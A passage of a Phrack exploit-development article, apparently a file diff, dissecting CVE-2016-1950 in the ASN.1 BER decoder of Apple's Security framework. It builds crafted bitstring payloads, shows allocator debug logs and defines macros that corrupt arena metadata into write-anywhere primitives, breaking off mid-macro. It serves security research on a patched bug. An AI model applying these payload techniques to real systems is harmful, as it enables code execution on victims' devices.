@@ -1,0 +1,2224 @@
+                            ==Phrack Inc.==
+
+               Volume 0x10, Issue 0x46, Phile #0x0c of 0x0f
+
+|=-----------------------------------------------------------------------=|
+|=----------------------=[ The Bear in the Arena ]=----------------------=|
+|=-----------------------------------------------------------------------=|
+|=------------------------------=[ xerub ]=------------------------------=|
+|=-----------------------------------------------------------------------=|
+
+
+-- Table of contents
+
+0 - Introduction
+1 - ASN.1 basics
+    1.0 - BER basics
+2 - Enter the bug
+    2.0 - The allocator
+    2.1 - The state machine
+    2.2 - The subtle flaw
+    2.3 - The strategy
+3 - Exploit techniques
+    3.0 - PKCS#7
+    3.1 - Building blocks
+4 - Fast forward
+    4.0 - Rolling the dice
+    4.1 - Dance, little bunny!
+    4.2 - He who controls the Arena
+    4.2.0 - Copyout
+    4.2.1 - Copyin
+    4.2.2 - Arithmetic
+    4.3 - Assembling the pieces
+5 - Conclusions
+6 - References
+7 - Source code
+
+-- 0 - Introduction
+
+In this article we set out to analyse an old bug, namely CVE-2016-1950[0].
+While the bug was fixed long ago, it is worth dissecting it because of its
+particularities and potential effects it had before it was patched. The bug
+was present in the Mozilla NSS (the BER ASN.1 parser to be more specific) a
+codebase that is also used by iOS/macOS, thereby impacting all applications
+using the Security framework. We'll walk through some exploit techniques
+powerful enough to gain code execution in certain daemons.
+
+-- 1 - ASN.1 basics
+
+Abstract Syntax Notation One (ASN.1) is an interface description language
+used for defining data structures that can be serialised and deserialised
+in a cross-platform way[1]. It is used in telecommunications and computer
+networking, cryptography, and other fields.
+
+Let's start with a simple example of ASN.1:
+
+    FooProtocol DEFINITIONS ::= BEGIN
+        FooQuestion ::= SEQUENCE {
+            trackingNumber INTEGER,
+            question       IA5String
+        }
+        FooAnswer ::= SEQUENCE {
+            questionNumber INTEGER,
+            answer         BOOLEAN
+        }
+    END
+
+And the messages:
+
+    myQuestion FooQuestion ::= {
+        trackingNumber     5,
+        question           "Anybody there?"
+    }
+
+    myAnswer FooAnswer ::= {
+        questionNumber     5,
+        answer           true
+    }
+
+In order to pass around the actual messages, they have to be encoded by the
+sender and decoded by the receiver. There exist various types of encodings:
+DER, BER, XER, CER, PER and so on, but in this article we will focus on BER
+(Basic Encoding Rules) for reasons that will become apparent later.
+
+-- 1.0 - BER basics
+
+BER is a TLV encoding, aka type-length-value. Each data element is encoded
+as a Type, followed by a Length, followed by the actual Data and optionally
+an end-of-content marker.
+
+    +------+--------+------+----------------+
+    | Type | Length | Data | END (optional) |
+    +------+--------+------+----------------+
+
+ITU-T X.680 defines the Type:
+
+    End-of-Content (EOC)        Primitive               0
+    BOOLEAN                     Primitive               1
+    INTEGER                     Primitive               2
+    BIT STRING                  Primitive/Constructed   3
+    ...
+    SEQUENCE and SEQUENCE OF    Constructed             16
+
+The Type is encoded as an ASN tag. In its simplest form it looks like this:
+
+    +----------------+-------------------------------+---------------+
+    | Class (2 bits) | Primitive/Constructed (1 bit) | Type (5 bits) |
+    +----------------+-------------------------------+---------------+
+
+When the type exceeds 5 bits, the tag is encoded a bit differently, but we
+don't need it for the purpose of this writeup.
+
+For our FooAnswer example, the simplest encoding would be (in hex):
+
+    30          is a combination of 0x20 (Constructed) + 0x10 (Sequence)
+    06          is the total sequence length
+        02      denotes an integer
+        01      denotes the length of the integer in bytes
+        05      the actual integer value
+        01      denotes a boolean
+        01      denotes the length of the boolean in bytes
+        FF      the actual boolean value (TRUE)
+
+It is important to note that BER encoding is quite flexible. For example,
+we can have a bitstring expressed as a sequence of one or more primitive
+bitstrings:
+
+    23          is a combination of 0x20 (Constructed) + 0x03 (Bit String)
+    09          is the total length of the components
+        03      denotes a bitstring
+        02      the length of the bitstring in bytes, plus 1
+        00      number of unused trailing bits at the end of the last byte
+        41      the first part of the actual bitstring
+        03      denotes a bitstring
+        02      the length of the bitstring in bytes, plus 1
+        01      number of unused trailing bits at the end of the last byte
+        42 42   the second part of the actual bitstring
+
+The decoder should merge those bitstrings, resulting in: 010000010100001.
+
+Length can be specified in two ways: indefinite and definite. The former
+does not encode the length at all, but the content data must finish at EOC.
+The latter has two forms: short and long. The short form is a single byte
+in range [0 .. 127]. The long form is expressed as (0x80 + size of length),
+followed by the actual length in big-endian format. This is not terribly
+important but such encodings may pop up later in our article.
+
+There are many other examples of BER flexibility, but we will not concern
+ourselves with those, because they are outside the scope of this article.
+
+DER is very similar to BER, but with all that flexibility removed. Whereas
+BER has many ways to skin the cat, DER will provide only one, the canonical
+form. Because ASN.1 parsers tend to become very complex to handle all sorts
+of obscure BER input, they can become a rich source of bugs.
+
+-- 2 - Enter the bug
+
+For a very long time, security researchers have looked for software bugs
+using differential analysis, especially when the vendor is vague about the
+fixed vulnerabilities. Oftentimes, after a security update, it is worth
+diffing or -- when the source is not available -- bindiffing between the
+new version and the old one.
+
+Let's take a look at the security content of iOS 9.3 update[0], matching
+with OS X El Capitan v10.11.4 / Security Update 2016-002. Somewhere down
+the line, it says:
+
+    Security:
+    Impact: Processing a maliciously crafted certificate may lead to
+    arbitrary code execution
+    Description: A memory corruption issue existed in the ASN.1 decoder.
+    This issue was addressed through improved input validation.
+    CVE-2016-1950 : Francis Gabriel of Quarkslab
+
+OK, this sounds pretty bad. Or good, depending on the perspective. In this
+case the sources were available[2], so it was worth enough diffing them:
+
+    $ diff -Naurp Security-57337.20.44 Security-57337.40.85
+
+Most of the relevant code is in Security-57337.20.44/OSX/libsecurity_asn1/
+and something interesting pops up in secasn1d.c.diff:
+
+    // If this is a bit string, the length is bits, not bytes.
+
+Indeed, the old code looks somewhat fishy:
+
+    PORT_Memcpy(item->Data + item->Length, buf, len);
+    item->Length += len;
+    ... and somewhere down the line...
+    item->Length = (item->Length << 3) - state->bit_string_unused_bits;
+
+A quick glance tells us the bit vs byte confusion happens at concatenating
+multiple primitive bitstrings and smells like OOB write. The offset seems
+to jump geometrically higher and higher in `sec_asn1d_parse_leaf` and it is
+reachable from:
+
+    sec_asn1d_parse_more_bit_string
+    SEC_ASN1DecoderUpdate
+    SEC_ASN1Decode
+    SecAsn1Decode
+
+-- 2.0 - The allocator
+
+The decoder has its own memory allocator, an Arena Allocator[3], designed
+to be simple and fast. Introduced by Douglas T. Ross around 1967, it was
+later demonstrated by Hanson in 1990 that Arenas are the fastest memory
+management solution.
+
+In its simplest form, an Arena Allocator cuts consecutive slices from a big
+block of memory, which was previously requested from the Operating System.
+These blocks are considered "large" by the system allocator, and therefore
+happen to be aligned to at least 256 bytes. When the current Arena block is
+exhausted a new block is requested from the OS and the process is repeated.
+Usually the memory is freed all-at-once, if at all.
+
+The ASN.1 decoder allocates memory via `sec_asn1d_[z]alloc` which calls
+`PORT_ArenaAlloc` in secport.c, which in turn calls `PL_ARENA_ALLOCATE` in
+plarena.h
+
+The freeing is done by `PORT_FreeArena` which calls `PL_CLEAR_ARENA` macro
+for each linked Arena. It was supposed to nuke the memory contents, but in
+Release mode it does nothing, which allows us to get away without crashing
+after we start manipulating the Arena meta-data. OK, that was a spoiler...
+
+The memory manager consists of two pools, each pool containing a linked
+list of Arenas. `our_pool` holds arenas for state objects and temporary
+storage, and `their_pool` keeps the destination structures. Each Arena is
+being defined by the following structure:
+
+    struct PLArena {
+        PLArena     *next; /* next arena for this lifetime */
+        PRUword     base;  /* aligned base address, follows this header */
+        PRUword     limit; /* one beyond last byte in arena */
+        PRUword     avail; /* points to next available byte */
+    };
+
+Which is laid out in memory:
+
+               +------------------+
+               |                  v
+    +------+------+-------+-------+-------------------+
+    | next | base | limit | avail | ... USED|FREE ... |
+    +------+------+-------+-------+-------------------+
+                      |       |             ^         ^
+                      |       +-------------+         |
+                      +-------------------------------+
+
+After one `PORT_ArenaAlloc`, avail moves toward the limit:
+
+    +------+------+-------+-------+-------------------+
+    | next | base | limit | avail | ... USED ...|FREE |
+    +------+------+-------+-------+-------------------+
+                      |       |                 ^     ^
+                      |       +-----------------+     |
+                      +-------------------------------+
+
+When an Arena is exhausted, a new one is linked in and the process repeats.
+At any given time, we are guaranteed that the next allocation will happen
+between `avail` and `limit`.
+
+-- 2.1 - The state machine
+
+As it turns out, we can build libasn1.dylib from the published sources: we
+change to Security-57337.20.44/OSX/libsecurity_asn1/ and, after a bit of
+plumbing, we can finally type "make". This allows us to instrument/debug
+the library and visualise the allocations, the state transitions, etc. Our
+business is in Security-57337.20.44/OSX/libsecurity_asn1/secasn1d.c, please
+keep an eye on it, there will be a lot of code snippets as we move forward.
+
+Let's investigate how the ASN.1 parsing really works. The decoder is driven
+by the so-called templates, which define a decoding schema for the expected
+input. For example, when decoding a signed X.509 certificate, it will use
+`kSecAsn1SignedCertTemplate`. A template may contain various subtemplates:
+`kSecAsn1TBSCertificateTemplate`, `kSecAsn1AlgorithmIDTemplate` and so on.
+This mechanism makes sure the elements come in the required order and the
+parsing stops if the consumed element does not match the expected type:
+
+    Template (expected)         Input data (actual)
+        Element type    <==+==>         Element
+                           v
+        Element type    <==+==>         Element
+                           v
+        Element type    <==+==>         Element
+                           X
+        Element type    <==!==>         Wrong element
+
+The state of the currently parsed element is kept in `sec_asn1d_state`, a
+structure containing various flags, sub-items and a pointer to the current
+template -- this will become important a bit later. The state object looks
+like this:
+
+    typedef struct sec_asn1d_state_struct {
+        SEC_ASN1DecoderContext *top;
+        const SecAsn1Template *theTemplate;
+        void *dest; // SecAsn1Item *item
+        ...
+        struct sec_asn1d_state_struct *parent;
+        ...
+        unsigned int bit_string_unused_bits;
+        struct subitem *subitems_head;
+        struct subitem *subitems_tail;
+        ...
+    } sec_asn1d_state;
+
+Small note: during this writeup, `item` will always refer to `state->dest`
+and may be used interchangeably hereinafter.
+
+The ASN.1 parser consumes the input, allocating memory as it goes. For each
+element, a state object and the actual data are laid down in memory inside
+whatever Arena is active at that given point.
+
+    +------+------+-------+-------+-----------------------------------+
+    | next | base | limit | avail | STATE, DATA, STATE, DATA ...|FREE |
+    +------+------+-------+-------+-----------------------------------+
+                      |       |                                 ^     ^
+                      |       +---------------------------------+     |
+                      +-----------------------------------------------+
+
+Now we can build a simple example, a constructed bitstring composed of two
+primitive bitstrings:
+
+    len = 256;
+
+    CONS_BITSTRING(len);
+        REP_BITSTRING(0, 10, 'a');
+
+    if (len) {
+        START_BITSTRING(0, len - 1);
+        while (len) {
+            PUSH1('z');
+        }
+    }
+
+The above pseudo-code will generate:
+
+    23          constructed bitstring
+    82 01 00    length (2 byte long form): 0x100 bytes
+        03      primitive bitstring
+        0B      length: 11 bytes, including the unused bits specifier
+        00      number of unused bits, trailing at the end of the last byte
+        "aaaaaaaaaa"
+        03      primitive bitstring
+        81 F0   length (1 byte long form): 240 bytes
+        00      number of unused bits, trailing at the end of the last byte
+        "zzz..."
+
+Which can be decoded with the following call to libasn1.dylib:
+
+    SecAsn1Decode(input, input_size, kSecAsn1BitStringTemplate, &output);
+
+We get this:
+
+    new ARENA -> o_pool/0x7fab29003020 of size 2087
+    sec_asn1d_push_state:429: zalloc(144) -> 0x7fab29003070 in arena o_pool/0x7fab29003020 (left 1831)
+    new ARENA -> t_pool/0x7fab29000020 of size 1063
+    sec_asn1d_prepare_for_contents:1458: zalloc(256) -> 0x7fab29000020 in arena t_pool/0x7fab29000020 (left 775)
+    sec_asn1d_push_state:429: zalloc(144) -> 0x7fab29003100 in arena o_pool/0x7fab29003020 (left 1687)
+    STATE transition 0x7fab29003070 -> 0x7fab29003100
+    sec_asn1d_parse_leaf: memcpy(0x7fab29000020 + 0 = 0x7fab29000020, "6161616161616161", 10)   <-- [A]
+    adjusting item->len (10) to 80, unused=0x0                                                  <-- [B]
+    STATE transition 0x7fab29003100 -> 0x7fab29003070
+    STATE transition 0x7fab29003070 -> 0x7fab29003100
+    sec_asn1d_parse_leaf: memcpy(0x7fab29000020 + 80 = 0x7fab29000070, "7a7a7a7a7a7a7a7a", 239) <-- [C]
+    sec_asn1d_parse_leaf: pre-existing value = 0x0
+    adjusting item->len (319) to 2552, unused=0x0
+    STATE transition 0x7fab29003100 -> 0x7fab29003070
+    STATE transition 0x7fab29003070 -> 0x0
+
+`zalloc(144)` is allocating a new state object. `zalloc(256)` is allocating
+space for the bitstring itself. And we observe the two memcpy:
+
+    memcpy(0x7fab29000020 + 0 = 0x7fab29000020, "6161616161616161", 10)   // the 1st memcpy: [A]
+    memcpy(0x7fab29000020 + 80 = 0x7fab29000070, "7a7a7a7a7a7a7a7a", 239) // the 2nd memcpy: [C]
+
+That is, the state machine is concatenating the two primitive bitstrings to
+create the final constructed bitstring. But the bitstring pieces should be
+adjacent, yet they are not, because:
+
+    PORT_Memcpy(item->Data + item->Length, buf, len);
+    item->Length += len;
+    ...
+    item->Length = (item->Length << 3) - state->bit_string_unused_bits;
+
+At each concatenation, `item->Length` is used as an offset and then it is
+updated, growing exponentially higher by roughly a factor of 8, as seen
+above at [B].
+
+The good news is that the overflow works. The bad news is that the memcpy
+happens in `their_pool` Arena, whereas the state objects are allocated in
+`our_pool` Arena. This is not great, since it may be difficult to massage
+`their_pool` Arenas and -- even if we pull it off -- there may be nothing
+interesting there. We want `our_pool` Arenas, because that's where the
+state objects are.
+
+-- 2.2 - The subtle flaw
+
+By carefully analysing the state machine for whatever ways of switching to
+`our_pool`, we notice a weird thing in `sec_asn1d_parse_bit_string`:
+
+    if ((state->pending == 0) || (state->contents_length == 1)) {
+        if (state->dest != NULL) {
+            SecAsn1Item *item = (SecAsn1Item *)(state->dest);
+            item->Data = NULL; // <-- [D]
+            item->Length = 0;
+            state->place = beforeEndOfContents;
+        }
+        if (state->contents_length == 1) {
+            /* skip over (unused) remainder byte */
+            return 1;
+        } else {
+            return 0;
+        }
+    }
+
+It looks like a shortcut for empty primitive strings. It essentially nukes
+the destination item and switches to `beforeEndOfContents`. It looks almost
+legit, except it is throwing away the old `item->Data` by setting it to
+NULL, as seen at [D]. Then, when the next bitstring component arrives,
+`sec_asn1d_prepare_for_contents` sees that `item` is nuked and allocates it
+anew, but this time in `our_pool`. The allocation size is fit to accomodate
+the last length that was parsed.
+
+And here things start to become interesting. A constructed bitstring has a
+total length and then each component has its own length (all of these must
+sum up to the total). If we enter `sec_asn1d_prepare_for_contents` right
+after the shortcut, the parser must have already parsed the next component
+and the last parsed length will be of that component, which is smaller than
+the total. What we just achieved was to throw away the good `item->Data`
+(sized for the grand total) and replace it with a new `item->Data` (sized
+for the next component after the shortcut). If the shortcut didn't exist,
+then `sec_asn1d_prepare_for_contents` would have not allocated `item->Data`
+again, and the size of the allocation would have remained fit for the grand
+total. This is a bug in its own right, but more on that later...
+
+The switch to `our_pool` was our goal, and we got it:
+
+    alloc_len = state->contents_length;
+    ...
+    if (item == NULL || state->top->filter_only) {
+        ...
+    } else if (state->substring) {
+        /*
+         * If we are a substring of a constructed string, then we may
+         * not have to allocate anything (because our parent, the
+         * actual constructed string, did it for us).  If we are a
+         * substring and we *do* have to allocate, that means our
+         * parent is an indefinite-length, so we allocate from our pool;
+         * later our parent will copy our string into the aggregated
+         * whole and free our pool allocation.
+         */
+        if (item->Data == NULL) {
+            PORT_Assert (item->Length == 0);
+            poolp = state->top->our_pool;
+        } else {
+            alloc_len = 0;
+        }
+    } else {
+        ...
+    }
+
+    if (alloc_len || ...) {
+        ...
+        if (item) {
+            item->Data = (unsigned char*)sec_asn1d_zalloc (poolp, alloc_len);
+        }
+        ...
+    }
+
+Let's try again, forcing the switch to `our_pool` by introducing an empty
+bitstring aka the shortcut aka the breaker aka the key to the kingdom:
+
+    CONS_BITSTRING(len);           // item->Data is a block of size=len in their_pool
+        START_BITSTRING(0, 0);     // nuke item->Data
+        REP_BITSTRING(0, 10, 'a'); // new item->Data is a block of size=10+1 in our_pool
+
+    if (len) {
+        START_BITSTRING(0, len - 1);
+        while (len) {
+            PUSH1('z');
+        }
+    }
+
+    new ARENA -> o_pool/0x7f84fc803020 of size 2087
+    sec_asn1d_push_state:429: zalloc(144) -> 0x7f84fc803070 in arena o_pool/0x7f84fc803020 (left 1831)
+    new ARENA -> t_pool/0x7f84fc800020 of size 1063
+    sec_asn1d_prepare_for_contents:1458: zalloc(256) -> 0x7f84fc800020 in arena t_pool/0x7f84fc800020 (left 775)
+    sec_asn1d_push_state:429: zalloc(144) -> 0x7f84fc803100 in arena o_pool/0x7f84fc803020 (left 1687)
+    STATE transition 0x7f84fc803070 -> 0x7f84fc803100
+    STATE transition 0x7f84fc803100 -> 0x7f84fc803070
+    STATE transition 0x7f84fc803070 -> 0x7f84fc803100
+    sec_asn1d_prepare_for_contents:1458: zalloc(11) -> 0x7f84fc803190 in arena o_pool/0x7f84fc803020 (left 1671)
+    sec_asn1d_parse_leaf: memcpy(0x7f84fc803190 + 0 = 0x7f84fc803190, "6161616161616161", 10)
+    adjusting item->len (10) to 80, unused=0x0
+    STATE transition 0x7f84fc803100 -> 0x7f84fc803070
+    STATE transition 0x7f84fc803070 -> 0x7f84fc803100
+    sec_asn1d_parse_leaf: memcpy(0x7f84fc803190 + 80 = 0x7f84fc8031e0, "7a7a7a7a7a7a7a7a", 236)
+    adjusting item->len (316) to 2528, unused=0x0
+    STATE transition 0x7f84fc803100 -> 0x7f84fc803070
+    STATE transition 0x7f84fc803070 -> 0x0
+
+`sec_asn1d_zalloc(11)` is allocating a temporary buffer of size 10+1.
+
+The parser creates a temporary buffer, which resides in `our_pool`, and it
+is using it to agglutinate the complete bitstring. But this buffer is only
+sized for the first part -- the 'a' part of size 10+1 -- and therefore it
+is much smaller than it should be. Remember that `our_pool` is a list of
+Arenas holding either state objects or temporary input data:
+
+                                                 "aaaaaaaaaa"   "zzz..."
+    +-------------+-------+-------+---------------------------------------+
+    | next | base | limit | avail | STATE, STATE, TEMPORARY |FREE...      |
+    +-------------+-------+-------+---------------------------------------+
+                      |       |                             ^             ^
+                      |       +-----------------------------+             |
+                      +---------------------------------------------------+
+
+Let's try again, but force another state object allocation after our short
+buffer which gets overflowed. We insert a nested constructed bitstring and
+see what happens. Yes, BER allows it. Yes, it is really that bad...
+
+    CONS_BITSTRING(len);
+        START_BITSTRING(0, 0);
+        CONS_BITSTRING(3 + 10);
+            REP_BITSTRING(0, 10, 'a');
+
+    if (len) {
+        START_BITSTRING(0, len - 1);
+        while (len) {
+            PUSH1('z');
+        }
+    }
+
+    new ARENA -> o_pool/0x7f91f3803020 of size 2087
+    sec_asn1d_push_state:429: zalloc(144) -> 0x7f91f3803070 in arena o_pool/0x7f91f3803020 (left 1831)
+    new ARENA -> t_pool/0x7f91f3800020 of size 1063
+    sec_asn1d_prepare_for_contents:1458: zalloc(256) -> 0x7f91f3800020 in arena t_pool/0x7f91f3800020 (left 775)
+    sec_asn1d_push_state:429: zalloc(144) -> 0x7f91f3803100 in arena o_pool/0x7f91f3803020 (left 1687)
+    STATE transition 0x7f91f3803070 -> 0x7f91f3803100
+    STATE transition 0x7f91f3803100 -> 0x7f91f3803070
+    STATE transition 0x7f91f3803070 -> 0x7f91f3803100
+    sec_asn1d_prepare_for_contents:1458: zalloc(13) -> 0x7f91f3803190 in arena o_pool/0x7f91f3803020 (left 1671)
+    sec_asn1d_push_state:429: zalloc(144) -> 0x7f91f38031a0 in arena o_pool/0x7f91f3803020 (left 1527)
+    STATE transition 0x7f91f3803100 -> 0x7f91f38031a0
+    sec_asn1d_parse_leaf: memcpy(0x7f91f3803190 + 0 = 0x7f91f3803190, "6161616161616161", 10)
+    sec_asn1d_parse_leaf: pre-existing value = 0x0
+    adjusting item->len (10) to 80, unused=0x0
+    STATE transition 0x7f91f38031a0 -> 0x7f91f3803100
+    STATE transition 0x7f91f3803100 -> 0x7f91f3803070
+    STATE transition 0x7f91f3803070 -> 0x7f91f3803100
+    sec_asn1d_parse_leaf: memcpy(0x7f91f3803190 + 80 = 0x7f91f38031e0, "7a7a7a7a7a7a7a7a", 234)
+    sec_asn1d_parse_leaf: pre-existing value = 0x3
+    adjusting item->len (314) to 2512, unused=0x0
+    STATE transition 0x7f91f3803100 -> 0x7f91f3803070
+    STATE transition 0x7f91f3803070 -> 0x0
+
+It is pretty obvious that we can overwrite the state object of the nested
+constructed bitstring.
+
+                                                 "aaaaaaaaaa"   "zzz..."
+    +-------------+-------+-------+---------------------------------------+
+    | next | base | limit | avail | STATE, STATE, TEMPORARY, STATE|FREE...|
+    +-------------+-------+-------+---------------------------------------+
+                      |       |                                   ^       ^
+                      |       +-----------------------------------+       |
+                      +---------------------------------------------------+
+
+However, by the time the second string gets copied, the nested state object
+is abandoned, and nothing happens. We deduce the actual smash must happen
+inside the nested constructed bitstring:
+
+    CONS_BITSTRING(len);
+        START_BITSTRING(0, 0);
+        CONS_BITSTRING(3 + 10 + 3 + 64);
+            REP_BITSTRING(0, 10, 'a');
+            REP_BITSTRING(0, 64, 'b'); // smashes the active state object
+
+    if (len) {
+        START_BITSTRING(0, len - 1);
+        while (len) {
+            PUSH1('z');
+        }
+    }
+
+    new ARENA -> o_pool/0x7fa27d003020 of size 2087
+    sec_asn1d_push_state:429: zalloc(144) -> 0x7fa27d003070 in arena o_pool/0x7fa27d003020 (left 1831)
+    new ARENA -> t_pool/0x7fa27d000020 of size 1063
+    sec_asn1d_prepare_for_contents:1458: zalloc(256) -> 0x7fa27d000020 in arena t_pool/0x7fa27d000020 (left 775)
+    sec_asn1d_push_state:429: zalloc(144) -> 0x7fa27d003100 in arena o_pool/0x7fa27d003020 (left 1687)
+    STATE transition 0x7fa27d003070 -> 0x7fa27d003100
+    STATE transition 0x7fa27d003100 -> 0x7fa27d003070
+    STATE transition 0x7fa27d003070 -> 0x7fa27d003100
+    sec_asn1d_prepare_for_contents:1458: zalloc(80) -> 0x7fa27d003190 in arena o_pool/0x7fa27d003020 (left 1607)
+    sec_asn1d_push_state:429: zalloc(144) -> 0x7fa27d0031e0 in arena o_pool/0x7fa27d003020 (left 1463)
+    STATE transition 0x7fa27d003100 -> 0x7fa27d0031e0
+    sec_asn1d_parse_leaf: memcpy(0x7fa27d003190 + 0 = 0x7fa27d003190, "6161616161616161", 10)
+    sec_asn1d_parse_leaf: pre-existing value = 0x0
+    adjusting item->len (10) to 80, unused=0x0
+    STATE transition 0x7fa27d0031e0 -> 0x7fa27d003100
+    STATE transition 0x7fa27d003100 -> 0x7fa27d0031e0
+    sec_asn1d_parse_leaf: memcpy(0x7fa27d003190 + 80 = 0x7fa27d0031e0, "6262626262626262", 64)
+    sec_asn1d_parse_leaf: pre-existing value = 0x7fa27d003020
+    <CRASH>
+
+Great! We can now smash an active state object while it is being accessed.
+
+-- 2.3 - The strategy
+
+Looking at the `sec_asn1d_state` structure, we realise there are many flags
+that we can smash, which may or may not confuse the ASN.1 parser state
+machine. And there are many pointers which we can do partial overwrites on,
+which has the effect of moving them to another controlled area inside the
+current Arena. However tempting is to try all of these, we realise there is
+a low-hanging fruit in there. Recall how the overwrite offset is computed:
+
+    item->Length += len;
+    ...
+    item->Length = (item->Length << 3) - state->bit_string_unused_bits;
+
+By making the `bit_string_unused_bits` large, we can have `item->Length`
+going negative. This has the effect of having `item->Data + item->Length`
+pointing somewhere to a smaller address, which can be used to smash other
+state objects, allocated previously. But then, we end up with the same
+problem, and then we'd have to figure out what state field to smash again.
+
+A better target is to smash the Arena structure itself. This is a meta-data
+attack. It works because the allocations inside an Arena are predictable by
+design. In fact, we know our bitstrings will always be laid out at the same
+distance from the start of the active Arena, for a given input.
+
+                                                  +---+
+                                       "aaaaaaaaaa"   v
+    +------+------+-------+-------+-------------------------------+
+    | next | base | limit | avail | ... TEMPORARY, STATE|FREE ... |
+    +------+------+-------+-------+-------------------------------+
+                  ^                                   |
+                  +---------------------------- dest -+
+
+After we do this, we trigger another allocation, with another bitstring. If
+we get it right we can manipulate Arena `limit/avail`, effectively gaining
+an allocate-anywhere primitive. And if we follow up with another bitstring,
+we have gained a write-anywhere primitive.
+
+    CONS_BITSTRING(len);
+        START_BITSTRING(0, 0);
+        CONS_BITSTRING(3 + 19 + 3 + 4);
+            REP_BITSTRING(4, 19, 'a'); // filler
+            START_BITSTRING(0, 4); // smash bit_string_unused_bits
+                PUSH4((19 * 8 - 4 + 4) * 8 + (0x3190 - 0x3020) + 2*8);
+
+        START_BITSTRING(0, 16); // smash the Arena
+            PUSH8(0x4141414141414140 + 16); // limit
+            PUSH8(0x4141414141414140); // avail
+
+        START_BITSTRING(0, 0); // trigger new allocation
+            REP_BITSTRING(0, 1, 'b'); // trigger new memcpy over allocation
+
+    if (len) {
+        START_BITSTRING(0, len - 1);
+        while (len) {
+            PUSH1('z');
+        }
+    }
+
+If the above seems somewhat confusing, refer to "openssl asn1parse" output:
+
+     0:d=0  hl=4 l= 256 cons: BIT STRING
+     4:d=1  hl=2 l=   1 prim:  BIT STRING  // break, trigger allocation
+     7:d=1  hl=2 l=  29 cons:  BIT STRING
+     9:d=2  hl=2 l=  20 prim:   BIT STRING // filler: "aaa..."
+    31:d=2  hl=2 l=   5 prim:   BIT STRING // bit_string_unused_bits
+    38:d=1  hl=2 l=  17 prim:  BIT STRING  // destination: Arena limit/avail
+    57:d=1  hl=2 l=   1 prim:  BIT STRING  // break, trigger fake alloc
+    60:d=1  hl=2 l=   2 prim:  BIT STRING  // write value: "b"
+    64:d=1  hl=3 l= 193 prim:  BIT STRING  // remainder "zzz..."
+
+    new ARENA -> o_pool/0x7ffe62803020 of size 2087
+    sec_asn1d_push_state:429: zalloc(144) -> 0x7ffe62803070 in arena o_pool/0x7ffe62803020 (left 1831)
+    new ARENA -> t_pool/0x7ffe62800020 of size 1063
+    sec_asn1d_prepare_for_contents:1458: zalloc(256) -> 0x7ffe62800020 in arena t_pool/0x7ffe62800020 (left 775)
+    sec_asn1d_push_state:429: zalloc(144) -> 0x7ffe62803100 in arena o_pool/0x7ffe62803020 (left 1687)
+    STATE transition 0x7ffe62803070 -> 0x7ffe62803100
+    STATE transition 0x7ffe62803100 -> 0x7ffe62803070
+    STATE transition 0x7ffe62803070 -> 0x7ffe62803100
+    sec_asn1d_prepare_for_contents:1458: zalloc(29) -> 0x7ffe62803190 in arena o_pool/0x7ffe62803020 (left 1655)
+    sec_asn1d_push_state:429: zalloc(144) -> 0x7ffe628031b0 in arena o_pool/0x7ffe62803020 (left 1511)
+    STATE transition 0x7ffe62803100 -> 0x7ffe628031b0
+    sec_asn1d_parse_leaf: memcpy(0x7ffe62803190 + 0 = 0x7ffe62803190, "6161616161616161", 19)
+    sec_asn1d_parse_leaf: pre-existing value = 0x0
+    adjusting item->len (19) to 148, unused=0x4
+    STATE transition 0x7ffe628031b0 -> 0x7ffe62803100
+    STATE transition 0x7ffe62803100 -> 0x7ffe628031b0
+    sec_asn1d_parse_leaf: memcpy(0x7ffe62803190 + 148 = 0x7ffe62803224, "640", 4)
+    sec_asn1d_parse_leaf: pre-existing value = 0x0
+    adjusting item->len (152) to 18446744073709551232, unused=0x640
+    STATE transition 0x7ffe628031b0 -> 0x7ffe62803100
+    STATE transition 0x7ffe62803100 -> 0x7ffe62803070
+    STATE transition 0x7ffe62803070 -> 0x7ffe62803100
+    sec_asn1d_parse_leaf: memcpy(0x7ffe62803190 + 18446744073709551232 = 0x7ffe62803010, "4141414141414150", 16)
+    sec_asn1d_parse_leaf: pre-existing value = 0x7ffe62803827
+    adjusting item->len (18446744073709551248) to 18446744073709548672, unused=0x0
+    STATE transition 0x7ffe62803100 -> 0x7ffe62803070
+    STATE transition 0x7ffe62803070 -> 0x7ffe62803100
+    STATE transition 0x7ffe62803100 -> 0x7ffe62803070
+    STATE transition 0x7ffe62803070 -> 0x7ffe62803100
+    sec_asn1d_prepare_for_contents:1458: zalloc(2) -> 0x4141414141414140 in arena o_pool/0x0 (left -1)
+    sec_asn1d_parse_leaf: memcpy(0x4141414141414140 + 0 = 0x4141414141414140, "62", 1)
+    sec_asn1d_parse_leaf: pre-existing value = 0x0
+    adjusting item->len (1) to 8, unused=0x0
+    STATE transition 0x7ffe62803100 -> 0x7ffe62803070
+    STATE transition 0x7ffe62803070 -> 0x7ffe62803100
+    sec_asn1d_parse_leaf: memcpy(0x4141414141414140 + 8 = 0x4141414141414148, "7a7a7a7a7a7a7a7a", 192)
+    sec_asn1d_parse_leaf: pre-existing value = 0x0
+    adjusting item->len (200) to 1600, unused=0x0
+    STATE transition 0x7ffe62803100 -> 0x7ffe62803070
+    STATE transition 0x7ffe62803070 -> 0x0
+
+We got our write-anywhere:
+
+    memcpy(0x4141414141414140 + 0, "62", 1)
+
+but apparently the remainder of the string is also written somewhere around
+that address. We will address this issue momentarily (pun intended).
+
+First, let's explain our contraption above. There are two magic values in
+our bitstring: the value with which to overwrite `bit_string_unused_bits`,
+and the length of the filler. The former is given by the offset of the
+temporary buffer inside our current Arena. It does vary depending on what
+elements have been processed before our bitstring, but for a given input
+it is considered constant:
+
+    D = 0x7fb191003190 - 0x7fb191003020 // actual values do not matter
+
+The latter can be calculated with the following formula:
+
+    K = (116=offsetof(sec_asn1d_state, bit_string_unused_bits) +
+         round8(K + 10) + 4=bit_string_unused_bits) / 8
+
+We find that K=19 satisfies the equation and it is a constant allowing us
+to reach `state->bit_string_unused_bits`. Now we can sum up all the above
+into a write-anywhere primitive:
+
+    #define MAKE_ARENA64(filler, arena_used, lower_bound, upper_bound) \
+    do { \
+        CONS_BITSTRING(10 + 19); \
+            REP_BITSTRING(4, 19, filler); \
+            \
+            START_BITSTRING(0, 4); \
+            PUSH4((19 * 8 - 4 + 4) * 8 + (arena_used) + 2*8); \
+        \
+        START_BITSTRING(0, 16); \
+            PUSH8(upper_bound); \
+            PUSH8(lower_bound); \
+    } while (0)
+
+    #define WRITE64(clean, x) \
+    do { \
+        START_BITSTRING(0, 0); \
+        if (clean) { \
+            START_BITSTRING(7, 1); \
+                PUSH1(x); \
+            START_BITSTRING(0, 7); \
+                PUSH7((x) >> 8); \
+        } else { \
